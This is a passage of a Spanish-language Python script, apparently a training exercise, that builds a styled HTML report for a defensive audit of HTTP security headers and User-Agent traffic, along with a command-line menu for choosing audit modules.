  --warn:#b45309; --warn-bg:#fef3c7; --warn-line:#fcd34d;
  --crit:#b91c1c; --crit-bg:#fee2e2; --crit-line:#fca5a5;
  --info:#1d4ed8; --info-bg:#dbeafe;
  --shadow:0 1px 2px rgba(16,24,40,.06),0 4px 16px rgba(16,24,40,.05);
}
@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
  color-scheme:dark;
  --bg:#0e141c; --surface:#161e29; --surface-2:#1d2733;
  --fg:#e7edf4; --muted:#95a3b6; --line:#2a3542;
  --accent:#a78bfa; --accent-soft:#2a2150;
  --ok:#4ade80; --ok-bg:#0f2e1c; --ok-line:#1f5133;
  --warn:#fbbf24; --warn-bg:#36280b; --warn-line:#5c4514;
  --crit:#f87171; --crit-bg:#3a1414; --crit-line:#5f1f1f;
  --info:#60a5fa; --info-bg:#15233f;
  --shadow:0 1px 2px rgba(0,0,0,.4),0 6px 20px rgba(0,0,0,.35);
}}
:root[data-theme="dark"]{
  color-scheme:dark;
  --bg:#0e141c; --surface:#161e29; --surface-2:#1d2733;
  --fg:#e7edf4; --muted:#95a3b6; --line:#2a3542;
  --accent:#a78bfa; --accent-soft:#2a2150;
  --ok:#4ade80; --ok-bg:#0f2e1c; --ok-line:#1f5133;
  --warn:#fbbf24; --warn-bg:#36280b; --warn-line:#5c4514;
  --crit:#f87171; --crit-bg:#3a1414; --crit-line:#5f1f1f;
  --info:#60a5fa; --info-bg:#15233f;
  --shadow:0 1px 2px rgba(0,0,0,.4),0 6px 20px rgba(0,0,0,.35);
}
body{background:var(--bg); color:var(--fg);
  font-family:"IBM Plex Sans",system-ui,-apple-system,Segoe UI,Roboto,sans-serif; line-height:1.55}
.mono{font-family:"IBM Plex Mono",ui-monospace,SFMono-Regular,Menlo,monospace}
.tnum{font-variant-numeric:tabular-nums}
.wrap{max-width:900px; margin:0 auto;
  padding-left:max(16px,env(safe-area-inset-left,0px));
  padding-right:max(16px,env(safe-area-inset-right,0px)); padding-block:0}
.nav{position:sticky; top:0; z-index:20;
  background:color-mix(in srgb,var(--surface) 86%,transparent);
  backdrop-filter:blur(8px); border-bottom:1px solid var(--line)}
.nav .wrap{display:flex; align-items:center; gap:14px; min-height:52px; flex-wrap:wrap; padding-block:8px}
.nav strong{font-weight:600; letter-spacing:.02em}
.nav .links{display:flex; gap:4px; flex-wrap:wrap; margin-left:auto}
.nav a{color:var(--muted); text-decoration:none; font-size:13px; padding:4px 9px; border-radius:7px}
.nav a:hover{color:var(--fg); background:var(--surface-2)}
.toggle{border:1px solid var(--line); background:var(--surface-2); color:var(--muted);
  border-radius:7px; padding:5px 9px; font-size:12px; cursor:pointer; font-family:inherit}
.toggle:hover{color:var(--fg)}
section{margin-block:34px}
h1{font-size:clamp(24px,5vw,34px); line-height:1.1; margin:0 0 6px; text-wrap:balance; letter-spacing:-.02em; word-break:break-word}
h2{font-size:19px; margin:0 0 14px; letter-spacing:-.01em}
.eyebrow{font-family:"IBM Plex Mono",monospace; text-transform:uppercase; letter-spacing:.14em;
  font-size:11px; color:var(--muted); margin:0 0 10px}
p{margin:0 0 10px}
.lead{color:var(--muted); max-width:62ch}
.hero{background:var(--surface); border:1px solid var(--line); border-radius:16px;
  box-shadow:var(--shadow); overflow:hidden; margin-top:26px}
.hero-top{padding:22px 24px; display:grid; grid-template-columns:1.3fr 1fr; gap:24px}
@media(max-width:640px){.hero-top{grid-template-columns:1fr}}
.meta-row{display:flex; flex-wrap:wrap; gap:6px 18px; color:var(--muted); font-size:13px; margin-top:6px}
.meta-row b{color:var(--fg); font-weight:600}
.verdict{display:flex; flex-direction:column; justify-content:center; gap:10px}
.gradewrap{display:flex; align-items:center; gap:14px}
.grade{font-size:44px; font-weight:700; line-height:1; width:64px; height:64px; display:flex; align-items:center; justify-content:center; border-radius:14px}
.grade.ok{background:var(--ok-bg); color:var(--ok)} .grade.warn{background:var(--warn-bg); color:var(--warn)} .grade.crit{background:var(--crit-bg); color:var(--crit)}
.meter{height:12px; border-radius:999px; background:var(--surface-2); position:relative; overflow:hidden; border:1px solid var(--line)}
.meter>span{position:absolute; inset:0 auto 0 0; border-radius:999px;
  background:linear-gradient(90deg,var(--crit),var(--warn) 45%,var(--ok))}
.meter-scale{display:flex; justify-content:space-between; font-size:11px; color:var(--muted); margin-top:4px}
.kpis{display:grid; grid-template-columns:repeat(3,1fr); border-top:1px solid var(--line)}
.kpi{padding:16px 18px; text-align:center}
.kpi+.kpi{border-left:1px solid var(--line)}
.kpi .num{font-size:28px; font-weight:700; line-height:1; letter-spacing:-.02em}
.kpi .lbl{font-size:12px; color:var(--muted); margin-top:5px}
.kpi.c .num{color:var(--crit)} .kpi.w .num{color:var(--warn)}
.actions{display:flex; flex-direction:column; gap:10px}
.action{display:flex; gap:13px; align-items:flex-start; background:var(--surface);
  border:1px solid var(--line); border-left:4px solid var(--crit); border-radius:10px; padding:14px 16px; box-shadow:var(--shadow)}
.action.w{border-left-color:var(--warn)} .action.i{border-left-color:var(--info)}
.action .rank{font-family:"IBM Plex Mono",monospace; font-weight:700; color:var(--muted); font-size:15px}
.action h3{margin:0 0 3px; font-size:15px}
.action p{margin:0; color:var(--muted); font-size:14px}
.finding{display:grid; grid-template-columns:auto 1fr; gap:12px; align-items:center;
  background:var(--surface); border:1px solid var(--line); border-radius:10px; padding:11px 14px; margin-bottom:8px}
.sev{font-size:11px; font-weight:700; letter-spacing:.04em; padding:3px 9px; border-radius:999px; white-space:nowrap; text-align:center}
.sev.crit{background:var(--crit-bg); color:var(--crit)} .sev.warn{background:var(--warn-bg); color:var(--warn)} .sev.info{background:var(--info-bg); color:var(--info)}
.finding .txt{font-size:14px}
.grid{display:grid; grid-template-columns:repeat(auto-fit,minmax(200px,1fr)); gap:10px}
.cell{background:var(--surface); border:1px solid var(--line); border-radius:10px; padding:12px 14px}
.cell .k{font-size:11px; color:var(--muted); text-transform:uppercase; letter-spacing:.08em}
.cell .v{font-size:15px; font-weight:600; margin-top:3px; word-break:break-word}
.cell .v.bad{color:var(--crit)} .cell .v.good{color:var(--ok)}
.tool{background:var(--surface); border:1px solid var(--line); border-radius:12px; margin-bottom:10px; overflow:hidden; box-shadow:var(--shadow)}
.tool>summary{list-style:none; cursor:pointer; padding:14px 16px; display:flex; align-items:center; gap:12px}
.tool>summary::-webkit-details-marker{display:none}
.tool .step{font-family:"IBM Plex Mono",monospace; font-size:12px; color:var(--muted); min-width:34px}
.tool .name{font-weight:600; flex:1; min-width:0}
.dot{width:10px; height:10px; border-radius:999px; flex:none}
.dot.ok{background:var(--ok)} .dot.warn{background:var(--warn)} .dot.crit{background:var(--crit)} .dot.info{background:var(--info)}
.chev{color:var(--muted); transition:transform .2s; flex:none}
.tool[open] .chev{transform:rotate(90deg)}
.tool .body{padding:2px 16px 16px; border-top:1px solid var(--line)}
.tool .body>:first-child{margin-top:14px}
table{width:100%; border-collapse:collapse; font-size:13.5px; margin:6px 0}
.tbl-wrap{overflow-x:auto}
th,td{text-align:left; padding:8px 10px; border-bottom:1px solid var(--line); vertical-align:top}
th{font-size:11px; text-transform:uppercase; letter-spacing:.06em; color:var(--muted); font-weight:600}
tr:last-child td{border-bottom:none}
.note{font-size:13px; color:var(--muted)}
footer{border-top:1px solid var(--line); margin-top:40px; padding-block:22px; color:var(--muted); font-size:12.5px}
:focus-visible{outline:2px solid var(--accent); outline-offset:2px; border-radius:4px}
@media(prefers-reduced-motion:reduce){*{transition:none!important}}
"""

_INFORME_NAV = """
<nav class="nav"><div class="wrap">
  <strong>Auditor HTTP</strong>
  <div class="links">
    <a href="#veredicto">Veredicto</a>
    <a href="#acciones">Acciones</a>
    <a href="#hallazgos">Hallazgos</a>
    <a href="#resumen">Resumen</a>
    <a href="#detalle">Detalle</a>
  </div>
  <button class="toggle" id="tgl" aria-label="Cambiar tema">Tema</button>
</div></nav>
"""

_INFORME_JS = """
<script>
(function(){
  var root=document.documentElement, btn=document.getElementById("tgl");
  try{var s=localStorage.getItem("hdr-theme"); if(s) root.setAttribute("data-theme",s);}catch(e){}
  if(btn) btn.addEventListener("click",function(){
    var cur=root.getAttribute("data-theme");
    var dark=cur? cur==="dark" : matchMedia("(prefers-color-scheme:dark)").matches;
    var next=dark?"light":"dark";
    root.setAttribute("data-theme",next);
    try{localStorage.setItem("hdr-theme",next);}catch(e){}
  });
})();
</script></body></html>
"""


def _esc(x):
    return html.escape(str(x), quote=True)


def _tabla_html(tabla):
    if not tabla or not tabla.get("filas"):
        return ""
    cab = "".join(f"<th>{_esc(c)}</th>" for c in tabla["cols"])
    filas = ""
    for fila in tabla["filas"]:
        filas += "<tr>" + "".join(f"<td>{_esc(c)}</td>" for c in fila) + "</tr>"
    return f'<div class="tbl-wrap"><table><tr>{cab}</tr>{filas}</table></div>'


def _seccion_html(sec):
    cuerpo = []
    if sec.get("nota"):
        cuerpo.append(f'<p class="note">{_esc(sec["nota"])}</p>')
    if sec.get("tabla"):
        cuerpo.append(_tabla_html(sec["tabla"]))
    if not cuerpo:
        cuerpo.append('<p class="note">Sin datos destacables en este apartado.</p>')
    dot = sec["estado"] if sec["estado"] in ("ok", "warn", "crit", "info") else "info"
    return (f'<details class="tool"><summary>'
            f'<span class="step">{sec["id"]:02d}</span>'
            f'<span class="dot {dot}"></span>'
            f'<span class="name">{_esc(sec["nombre"])}</span>'
            f'<span class="chev">&rsaquo;</span></summary>'
            f'<div class="body">{"".join(cuerpo)}</div></details>')


def _acciones_prioritarias():
    acc = []
    for nombre, importancia, expl in RESUMEN["faltan"]:
        sev = "crit" if "ALTA" in importancia else ("warn" if "MEDIA" in importancia else "info")
        acc.append((sev, f"Activar: {nombre}", expl))
    if RESUMEN["fugas"]:
        acc.append(("warn", "Ocultar los datos técnicos del servidor",
                    "El servidor revela su marca/versión (" +
                    ", ".join(t for t, _v in RESUMEN["fugas"][:3]) +
                    "). Ocúltalos en la configuración para no dar pistas a los atacantes."))
    if RESUMEN["sospechosas"]:
        acc.append(("warn", f"Revisar las {RESUMEN['sospechosas']} visitas sospechosas capturadas",
                    "El sensor detectó User-Agents de escáneres o ataques. Revisa esas peticiones y bloquea el origen si procede."))
    orden = {"crit": 0, "warn": 1, "info": 2}
    acc.sort(key=lambda a: orden.get(a[0], 3))
    return acc[:3]


def _hallazgos():
    r = []
    for nombre, importancia, _e in RESUMEN["faltan"]:
        if "ALTA" in importancia:
            r.append((3, f"Falta un escudo de importancia alta: {nombre}"))
        elif "MEDIA" in importancia:
            r.append((2, f"Falta un escudo de importancia media: {nombre}"))
    if RESUMEN["fugas"]:
        r.append((2, f"{len(RESUMEN['fugas'])} cabecera(s) revelan tecnología o versión del servidor"))
    if RESUMEN["sospechosas"]:
        r.append((3, f"{RESUMEN['sospechosas']} visita(s) sospechosa(s) o de ataque capturadas por el sensor"))
    return r


def generar_informe_html(url):
    clave = RESUMEN["clave"]
    letra = RESUMEN["nota_letra"]
    score = RESUMEN["score"]
    emoji = {"ok": "🟢", "warn": "🟡", "crit": "🔴"}[clave]
    titulo = {"ok": "Buenas prácticas de cabeceras", "warn": "Faltan escudos importantes",
              "crit": "La web está muy desprotegida"}[clave]
    fecha = datetime.now().strftime("%d/%m/%Y %H:%M")

    hero = (
        '<section id="veredicto"><div class="hero"><div class="hero-top">'
        '<div><p class="eyebrow">Informe de cabeceras y tráfico HTTP</p>'
        f'<h1>{_esc(url)}</h1>'
        '<div class="meta-row">'
        f'<span><b>Fecha:</b> {fecha}</span>'
        f'<span><b>Escudos activos:</b> {RESUMEN["escudos_presentes"]}/{RESUMEN["escudos_total"]}</span>'
        f'<span><b>Visitas capturadas:</b> {RESUMEN["visitas"]}</span>'
        '</div>'
        '<p class="note" style="margin-top:12px">Guía de color: 🟢 protegido / visitante normal · 🟡 revisar / robot · 🔴 ataque / sin protección.</p></div>'
        f'<div class="verdict"><div class="gradewrap"><div class="grade {clave}">{_esc(letra)}</div>'
        f'<div style="flex:1"><div class="meter" role="img" aria-label="Puntuación de cabeceras {score} de 100">'
        f'<span style="width:{score}%"></span></div>'
        '<div class="meter-scale"><span>F</span><span>C</span><span>A</span></div></div></div>'
        f'<p class="note" style="margin:2px 0 0">{emoji} {_esc(titulo)} · puntuación {score}/100.</p></div>'
        '</div><div class="kpis">'
        f'<div class="kpi"><div class="num tnum">{RESUMEN["escudos_presentes"]}/{RESUMEN["escudos_total"]}</div><div class="lbl">Escudos activos</div></div>'
        f'<div class="kpi w"><div class="num tnum">{len(RESUMEN["fugas"])}</div><div class="lbl">Fugas de información</div></div>'
        f'<div class="kpi c"><div class="num tnum">{RESUMEN["sospechosas"]}</div><div class="lbl">Visitas sospechosas</div></div>'
        '</div></div></section>'
    )

    acc = _acciones_prioritarias()
    if acc:
        items = ""
        for i, (sev, tit, desc) in enumerate(acc, 1):
            cls = {"crit": "", "warn": " w", "info": " i"}.get(sev, "")
            items += (f'<div class="action{cls}"><span class="rank">{i}</span>'
                      f'<div><h3>{_esc(tit)}</h3><p>{_esc(desc)}</p></div></div>')
    else:
        items = ('<div class="action i" style="border-left-color:var(--ok)">'
                 '<span class="rank">✓</span><div><h3>Sin acciones urgentes</h3>'
                 '<p>No se han detectado carencias graves en los apartados ejecutados.</p></div></div>')
    acciones_html = f'<section id="acciones"><h2>Qué hacer primero</h2><div class="actions">{items}</div></section>'

    riesgos = _hallazgos()
    clsmap = {3: "crit", 2: "warn", 1: "info"}
    lblmap = {3: "ALTO", 2: "MEDIO", 1: "INFO"}
    if riesgos:
        fh = ""
        for nivel_r, texto in sorted(riesgos, key=lambda x: -x[0]):
            fh += (f'<div class="finding"><span class="sev {clsmap[nivel_r]}">{lblmap[nivel_r]}</span>'
                   f'<span class="txt">{_esc(texto)}</span></div>')
    else:
        fh = ('<div class="finding"><span class="sev" style="background:var(--ok-bg);color:var(--ok)">OK</span>'
              '<span class="txt">No se registraron carencias ni visitas sospechosas.</span></div>')
    hallazgos_html = f'<section id="hallazgos"><h2>Semáforo de hallazgos</h2>{fh}</section>'

    servidor = RESUMEN["servidor"] or "No revelado (correcto)"
    serv_cls = "bad" if RESUMEN["servidor"] else "good"
    celdas = [
        ("Nota de cabeceras", f"{letra} ({score}/100)", RESUMEN["clave"] if RESUMEN["clave"] != "warn" else ""),
        ("Escudos activos", f"{RESUMEN['escudos_presentes']} de {RESUMEN['escudos_total']}", ""),
        ("Fugas de información", f"{len(RESUMEN['fugas'])} cabecera(s)", "bad" if RESUMEN["fugas"] else "good"),
        ("Banner del servidor", servidor, serv_cls),
        ("Visitas capturadas", str(RESUMEN["visitas"]), ""),
        ("Sospechosas / ataques", str(RESUMEN["sospechosas"]), "bad" if RESUMEN["sospechosas"] else "good"),
    ]
    cel_html = "".join(
        f'<div class="cell"><div class="k">{_esc(k)}</div><div class="v {cls}">{_esc(v)}</div></div>'
        for k, v, cls in celdas
    )
    resumen_html = f'<section id="resumen"><h2>Resumen de la auditoría</h2><div class="grid">{cel_html}</div></section>'

    incluidas = [s for s in SECCIONES if s.get("incluir")]
    cards = "".join(_seccion_html(s) for s in incluidas)
    detalle_html = (
        '<section id="detalle"><h2>Detalle por apartado</h2>'
        '<p class="lead" style="margin-bottom:16px">Cada apartado está plegado: ábrelo para ver el detalle traducido.</p>'
        f'{cards}</section>'
    )

    footer = (
        '<footer><p>Informe generado por Headers-UA v3.0 · Auditoría de cabeceras HTTP y sensor de User-Agent.</p>'
        '<p>El servidor capturador es una herramienta local de pruebas. Úsalo sobre tu propio equipo o entornos autorizados.</p></footer>'
    )

    head = (
        '<!doctype html><html lang="es"><head><meta charset="utf-8">'
        '<meta name="viewport" content="width=device-width, initial-scale=1">'
        f'<title>Informe de cabeceras · {_esc(url)}</title>'
        '<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>'
        '<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600;700&family=IBM+Plex+Mono:wght@400;500;600&display=swap">'
        f'<style>{_INFORME_CSS}</style></head><body>'
    )
    return "".join([head, _INFORME_NAV, '<div class="wrap">', hero, acciones_html,
                    hallazgos_html, resumen_html, detalle_html, footer, '</div>', _INFORME_JS])


# ==============================================================================
# CATÁLOGO DE MÓDULOS Y MENÚ INTERACTIVO
# ==============================================================================

CATALOGO_MODULOS = [
    {"id": 1, "nombre": "Auditoría de Escudos y Cabeceras de Seguridad (OWASP)",
     "requisitos": "Conexión a Internet (librería requests)", "func": mod_cabeceras_seguridad},
    {"id": 2, "nombre": "Detección de Fugas de Información (Information Disclosure)",
     "requisitos": "Conexión a Internet (librería requests)", "func": mod_fuga_informacion},
    {"id": 3, "nombre": "Servidor HTTP Capturador y Clasificador de User-Agent",
     "requisitos": "Puerto local disponible (http.server nativo)", "func": mod_servidor_user_agent},
    {"id": 4, "nombre": "Investigación: Qué se puede hacer con el User-Agent",
     "requisitos": "Módulo documental integrado (sin requisitos externos)", "func": mod_investigacion_ua},
]


def menu_seleccion_modulos():
    table = Table(title="Apartados Disponibles en el Script 2", box=box.ROUNDED, show_lines=True)
    table.add_column("Nº", justify="center", style="bold cyan")
    table.add_column("Apartado de la Práctica", style="bold white")
    table.add_column("Estado", justify="center", style="green")
    for m in CATALOGO_MODULOS:
        table.add_row(str(m["id"]), m["nombre"], "✔ Listo")
    console.print(table)
    console.print(Panel(
        "[bold cyan]¿Qué apartados deseas lanzar?[/bold cyan]\n"
        "  • Escribe números separados por comas (ejemplo: [bold yellow]1,2,3[/bold yellow] o [bold yellow]1,3[/bold yellow])\n"
        "  • Escribe [bold green]T[/bold green] para lanzar todos los apartados (1 al 4) de forma guiada",
        border_style="cyan"
    ))
    eleccion = Prompt.ask("👉 Selecciona los apartados", default="T").strip().upper()
    if eleccion == "T":
        return CATALOGO_MODULOS
    ids = {int(p.strip()) for p in eleccion.split(",") if p.strip().isdigit()}
    seleccionados = [m for m in CATALOGO_MODULOS if m["id"] in ids]
    return seleccionados if seleccionados else CATALOGO_MODULOS


def main():
    parser = argparse.ArgumentParser(description="Script 2 v3.0 - Cabeceras de Seguridad y Servidor User-Agent")
    parser.add_argument("-u", "--url", help="URL o dominio a auditar sus cabeceras (ej: owasp.org)")
    parser.add_argument("-p", "--port", type=int, default=8080, help="Puerto local para el servidor HTTP (por defecto: 8080)")
    parser.add_argument("-o", "--output", default=None, help="Nombre personalizado del archivo HTML (opcional)")
    parser.add_argument("--abrir-red", action="store_true", help="Exponer el servidor a toda la red local (0.0.0.0) en vez de solo a este equipo")
    parser.add_argument("--auto", action="store_true", help="Ejecutar todo automáticamente sin confirmaciones")
    args = parser.parse_args()

    console.print(BANNER)
    reset_acumuladores()

    url_input = args.url or Prompt.ask("🌐 Introduce la web cuyas cabeceras quieres analizar", default="https://owasp.org")
    url_completa = url_input.strip()
    if not url_completa.startswith(("http://", "https://")):
        url_completa = "https://" + url_completa
    RESUMEN["url"] = url_completa

    host = "0.0.0.0" if args.abrir_red else "127.0.0.1"

    host_limpio = url_completa.replace("https://", "").replace("http://", "").split("/")[0]
    host_sin_www = re.sub(r"^www\.", "", host_limpio, flags=re.IGNORECASE)
    nombre_web = host_sin_www.split(".")[0]
    archivo_salida = args.output if args.output else f"informe{nombre_web}.html"

    interactivo = not args.auto
    modulos_elegidos = menu_seleccion_modulos() if interactivo else CATALOGO_MODULOS

    if interactivo:
        validar_paso_a_paso = Confirm.ask(
            "🔎 ¿Quieres activar la [bold]validación paso a paso[/bold] (confirmar antes y después de cada apartado)?",
            default=True)
    else:
        validar_paso_a_paso = False

    portada = Panel(
        f"[bold white]INFORME DE CABECERAS DE SEGURIDAD Y TRÁFICO USER-AGENT (PARA NO EXPERTOS)[/bold white]\n\n"
        f"• [bold cyan]Sitio Web Auditado:[/bold cyan] {url_completa}\n"
        f"• [bold cyan]Servidor Sensor:[/bold cyan] http://{host}:{args.port}\n"
        f"• [bold cyan]Archivo de Informe:[/bold cyan] {archivo_salida}\n"
        f"• [bold cyan]Fecha del Estudio:[/bold cyan] {datetime.now().strftime('%d/%m/%Y a las %H:%M:%S')}\n"
        f"• [bold cyan]Guía de Colores:[/bold cyan] 🟢 Protegido / Visitante Normal   |   🟡 Precaución / Robot   |   🔴 Peligro / Ataque",
        title="Resumen Ejecutivo - Script 2", border_style="bright_magenta", box=box.DOUBLE
    )
    console.print("\n", portada, "\n")

    for m in modulos_elegidos:
        if validar_antes_de_ejecutar(m, interactivo=validar_paso_a_paso):
            if m["id"] == 3:
                bloques = m["func"](url_completa, args.port, interactivo=interactivo, host=host)
            else:
                bloques = m["func"](url_completa, args.port, interactivo=interactivo)
            incluir = validar_despues_de_ejecutar(bloques, m["nombre"], interactivo=validar_paso_a_paso)
            if SECCIONES and SECCIONES[-1]["id"] == m["id"]:
                SECCIONES[-1]["incluir"] = incluir
        else:
            console.print(f"  [dim]⏭ Saltando apartado '{m['nombre']}'.[/dim]\n")

    html_informe = generar_informe_html(url_completa)
    with open(archivo_salida, "w", encoding="utf-8") as f:
        f.write(html_informe)

    console.print(Panel(
        f"🎉 [bold green]¡Auditoría y captura finalizadas con éxito![/bold green]\n"
        f"• Informe HTML (veredicto, acciones, hallazgos y detalle plegable): [bold yellow]{archivo_salida}[/bold yellow]\n"
        f"• Registro técnico de User-Agents:  [bold cyan]capturas_user_agent.json[/bold cyan]",
        title="Fin del Script 2", border_style="green"
    ))


if __name__ == "__main__":
    main()
